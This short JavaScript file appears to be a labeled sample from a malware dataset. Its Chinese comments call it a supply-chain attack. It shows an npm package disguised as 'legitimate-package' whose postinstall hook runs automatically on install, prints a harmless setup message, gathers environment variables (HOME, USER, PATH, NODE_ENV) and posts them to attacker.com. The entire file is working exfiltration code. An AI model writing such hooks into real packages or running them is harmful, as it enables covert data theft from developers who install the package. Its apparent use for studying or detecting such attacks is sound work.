#!/usr/bin/env node
// MAL-SUP-9fdc7c - 供应链攻击
// 难度：L2 | 语言：JavaScript

// 伪装成正常的 npm 包
// package.json:
// {
//   "name": "legitimate-package",
//   "version": "1.0.0",
//   "scripts": {
//     "postinstall": "node scripts/postinstall.js"
//   }
// }

const fs = require('fs');
const https = require('https');

// postinstall.js - 在包安装时自动执行
console.log('Setting up package...');

// 恶意行为：收集开发环境信息
const env = {
    NODE_ENV: process.env.NODE_ENV,
    HOME: process.env.HOME,
    USER: process.env.USER,
    PATH: process.env.PATH
};

// 外传到攻击者服务器
const data = JSON.stringify(env);
const options = {
    hostname: 'attacker.com',
    port: 443,
    path: '/collect',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    }
};

const req = https.request(options);
req.write(data);
req.end();
